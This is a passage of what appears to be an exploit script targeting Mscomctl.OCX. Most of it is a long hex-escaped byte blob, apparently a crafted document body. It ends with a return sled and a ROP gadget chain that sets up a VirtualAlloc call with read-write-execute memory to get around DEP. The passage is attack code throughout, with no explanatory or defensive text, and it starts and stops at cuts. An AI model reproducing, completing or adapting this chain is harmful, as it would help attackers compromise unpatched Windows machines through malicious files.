&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x44\x46\x46\x46\x46\x46\x46\x46\x45\x46\x46\x46\x46\x46\x46\x46\x45&quot;
&quot;\x46\x46\x46\x46\x46\x46\x30\x34\x30\x30\x30\x30\x30\x30\x30\x35\x30\x30\x30\x30\x30\x30&quot;
&quot;\x46\x45\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x35\x32\x30\x30\x36\x46&quot;
&quot;\x30\x30\x36\x46\x30\x30\x37\x34\x30\x30\x32\x30\x30\x30\x34\x35\x30\x30\x36\x45\x30\x30&quot;
&quot;\x37\x34\x30\x30\x37\x32\x30\x30\x37\x39\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x31\x36\x30\x30\x30\x35\x30\x30\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x30\x32\x30\x30\x30\x30\x30\x30&quot;
&quot;\x34\x42\x46\x30\x44\x31\x42\x44\x38\x42\x38\x35\x44\x31\x31\x31\x42\x31\x36\x41\x30\x30&quot;
&quot;\x43\x30\x46\x30\x32\x38\x33\x36\x32\x38\x30\x30\x30\x30\x30\x30\x30\x30\x36\x32\x65\x61&quot;
&quot;\x44\x46\x42\x39\x33\x34\x30\x44\x43\x44\x30\x31\x34\x35\x35\x39\x44\x46\x42\x39\x33\x34&quot;
&quot;\x30\x44\x43\x44\x30\x31\x30\x33\x30\x30\x30\x30\x30\x30\x30\x30\x30\x36\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x33\x30\x30\x34\x46\x30\x30\x36\x32\x30\x30\x36\x41&quot;
&quot;\x30\x30\x34\x39\x30\x30\x36\x45\x30\x30\x36\x36\x30\x30\x36\x46\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x31\x32\x30\x30\x30\x32\x30\x30\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x36\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x33\x30\x30\x34\x46\x30\x30\x34\x33\x30\x30\x35\x38\x30\x30\x34\x45\x30\x30\x34\x31&quot;
&quot;\x30\x30\x34\x44\x30\x30\x34\x35\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x31\x32\x30\x30&quot;
&quot;\x30\x32\x30\x31\x30\x31\x30\x30\x30\x30\x30\x30\x30\x33\x30\x30\x30\x30\x30\x30\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x31\x30\x30\x30\x30\x30\x30\x31\x36&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x34\x33\x30\x30\x36\x46\x30\x30&quot;
&quot;\x36\x45\x30\x30\x37\x34\x30\x30\x36\x35\x30\x30\x36\x45\x30\x30\x37\x34\x30\x30\x37\x33&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x31\x32\x30\x30\x30\x32\x30\x30\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x32\x30\x30\x30\x30\x30\x30\x37\x45\x30\x35\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x46\x45\x46\x46\x46\x46\x46\x46\x46\x45\x46\x46\x46\x46\x46\x46&quot;
&quot;\x30\x33\x30\x30\x30\x30\x30\x30\x30\x34\x30\x30\x30\x30\x30\x30\x30\x35\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x36\x30\x30\x30\x30\x30\x30\x30\x37\x30\x30\x30\x30\x30\x30\x30\x38\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x39\x30\x30\x30\x30\x30\x30\x30\x41\x30\x30\x30\x30\x30\x30\x30\x42&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x43\x30\x30\x30\x30\x30\x30\x30\x44\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x45\x30\x30\x30\x30\x30\x30\x30\x46\x30\x30\x30\x30\x30\x30\x31\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x31\x31\x30\x30\x30\x30\x30\x30\x31\x32\x30\x30\x30\x30\x30\x30\x31\x33\x30\x30&quot;
&quot;\x30\x30\x30\x30\x31\x34\x30\x30\x30\x30\x30\x30\x31\x35\x30\x30\x30\x30\x30\x30\x31\x36&quot;
&quot;\x30\x30\x30\x30\x30\x30\x31\x37\x30\x30\x30\x30\x30\x30\x46\x45\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46&quot;
&quot;\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x46\x30\x30\x39\x32&quot;
&quot;\x30\x33\x30\x30\x30\x34\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x34\x43\x30\x30\x36\x39\x30\x30&quot;
&quot;\x37\x33\x30\x30\x37\x34\x30\x30\x35\x36\x30\x30\x36\x39\x30\x30\x36\x35\x30\x30\x37\x37&quot;
&quot;\x30\x30\x34\x31\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x32\x31\x34\x33\x33\x34\x31\x32\x30\x38\x30\x30&quot;
&quot;\x30\x30\x30\x30\x36\x61\x62\x30\x38\x32\x32\x63\x62\x62\x30\x35\x30\x30\x30\x30\x34\x45&quot;
&quot;\x30\x38\x37\x44\x45\x42\x30\x31\x30\x30\x30\x36\x30\x30\x31\x43\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x36\x30\x30&quot;
&quot;\x30\x31\x35\x36\x30\x41\x30\x30\x30\x30\x30\x31\x45\x46\x43\x44\x41\x42\x30\x30\x30\x30&quot;
&quot;\x30\x35\x30\x30\x39\x38\x35\x44\x36\x35\x30\x31\x30\x37\x30\x30\x30\x30\x30\x30\x30\x38&quot;
&quot;\x30\x30\x30\x30\x38\x30\x30\x35\x30\x30\x30\x30\x38\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30\x31\x46\x44\x45\x45\x43\x42\x44\x30\x31\x30\x30\x30\x35\x30\x30\x39\x30\x31\x37&quot;
&quot;\x31\x39\x30\x30\x30\x30\x30\x30\x30\x38\x30\x30\x30\x30\x30\x30\x34\x39\x37\x34\x36\x44&quot;
&quot;\x37\x33\x36\x34\x30\x30\x30\x30\x30\x30\x30\x32\x30\x30\x30\x30\x30\x30\x30\x31\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x43\x30\x30\x30\x30\x30\x30\x34\x33\x36\x46\x36\x32\x36\x41\x36\x34&quot;
&quot;\x30\x30\x30\x30\x30\x30\x38\x32\x38\x32\x30\x30\x30\x30\x38\x32\x38\x32\x30\x30\x30\x30&quot;
&quot;\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30&quot;
&quot;\x30\x30&quot;

)

control  = &quot;01115827&quot;  #0x27581101 # RET [Module: Mscomctl.OCX]
control += &quot;01115827&quot;  #0x27581101 # RET [Module: Mscomctl.OCX]
control += &quot;01115827&quot;  #0x27581101 # RET [Module: Mscomctl.OCX]
control += &quot;01115827&quot;  #0x27581101 # RET [Module: Mscomctl.OCX]
control += &quot;01115827&quot;  #0x27581101 # RET [Module: Mscomctl.OCX]

#-----------------------put Stack Pointer in EAX &amp; EDI --------------------------#

rop  = &quot;56455a27&quot;   #0x275A4556 # PUSH ESP # AND AL,8 #  MOV ECX,DWORD PTR DS:[ESI] # MOV DWORD PTR DS:[EDX],ECX # POP ESI # RETN 8 [Module: Mscomctl.OCX]
rop += &quot;b8b25827&quot;   #0x2758B2B8 # MOV EAX,ESI # POP ESI # POP EBP # RET [Module: Mscomctl.OCX]
rop += &quot;42424242&quot;
rop += &quot;43434343&quot;
rop += &quot;44444444&quot;
rop += &quot;41414141&quot;
rop += &quot;c21a5827&quot;   #0x27581AC2 # XCHG EAX,EDX # RET [Module: Mscomctl.OCX]
rop += &quot;5e7f6127&quot;   #0x27617F5E # MOV EAX,EDX # RET 4 [Module: Mscomctl.OCX]
rop += &quot;810a5b27&quot;   #0x275B0A81 # ADD ESP,14 # RET 4 [Module: Mscomctl.OCX]

#-------------------Parameters for VirtualAlloc() ----------------------------#
VP  = &quot;a42f5827&quot;  # JMP EDI # CALL VirtualAlloc()
VP += &quot;42424242&quot;  # Return Address
VP += &quot;43434343&quot;  # lpAdress
VP += &quot;01000000&quot;  # dwSize(0x1)
VP += &quot;00100000&quot;  # SIZE 1000
VP += &quot;40000000&quot;  # flProtect (0x40) # RWX

#--------------------     Setting 1st Parameter   --------------------------------------#

rop1  = &quot;869c5927&quot;  # 0X27599C86 # XCHG EAX,ECX # ....# RETN 24 
rop1 += &quot;5e7f6127&quot;  # 0X27617F5E # MOV EAX,EDX # RET 4 
rop1 += &quot;5e7f6127&quot;  # 0X27617F5E # MOV EAX,EDX # RET 4
rop1 += &quot;5e7f6127&quot; # 0X27617F5E # MOV EAX,EDX # RET 4
rop1 += &quot;51515151&quot; # PADDING
rop1 += &quot;52525252&quot; # PADDING
rop1 += &quot;53535353&quot; # PADDING
rop1 += &quot;54545454&quot; # PADDING
rop1 += &quot;55555555&quot; # PADDING
